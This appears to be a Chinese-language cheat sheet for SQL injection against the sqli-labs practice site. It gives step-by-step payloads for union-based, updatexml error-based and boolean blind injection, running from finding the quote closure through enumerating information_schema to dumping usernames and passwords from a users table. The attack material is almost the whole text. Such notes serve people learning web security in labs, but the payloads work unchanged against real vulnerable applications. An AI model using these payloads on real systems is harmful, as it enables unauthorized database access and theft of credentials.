一、联合注入（页面有信息回显时）

首先判断注入类型（在id后加上 '或 " ），通过页面报错判断闭合

然后通过 ?id=1' order by 3--+ 猜测列数（如果“+”被过滤，可以使用“#，%23”代替“--+”）

接着通过 ?id=-1'union select 1,2,3 --+ 得到会回显信息的字段。（sqli-labs是2和3回显）

?id=-1'union select 1,database(),3 --+ 得到当前数据库名

?id=-1'union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='数据库名'--+（查询当前数据库中所有表的名字）

?id=-1'union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema='数据库' and table_name='表名' --+

?id=-1'union select 1,group_concat(username),group_concat(password) from users --+(爆出字段信息)

注：初学建议通过分析原码来学习理解注入语句（学习文章 https://blog.csdn.net/elephantxiang/article/details/120091507）

二、报错注入（）
判断闭合后，直接通过 and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+ 爆出数据库 

  and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) --+(爆出表名)

and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1) --+（爆出字段名）

and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1) --+（得到信息）

注：应学习updatexml（）函数与extractvalue（）函数，截取函数substr（），substr最多能截取32位。

三、bool盲注

先判断闭合，当页面不会显示信息，但对错页面回显不同时，可以使用bool盲注

首先猜测数据库的长度 id=1’ and length(database())=8 --+

ascii(substr(database(),1,1))=”ASCII“ --+（通过ASCII码值确定数据库名）

and (select count(table_name) from information_schema.tables where table_schema=database())=1 --+（爆表的数量）

and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=""--+（变换 x 和 y 的值我们可以得到所有的表名。）

?id=1' and left((select column_name from information_schema.columns where table_schema=database() and table_name="表名" limit x,1),y)=""--+（爆字段名）

?id=1' and left((select ‘字段’ from ‘表名’ limit x,1),y)=""--+（得到数据）

注：通过python脚本可以辅助盲注
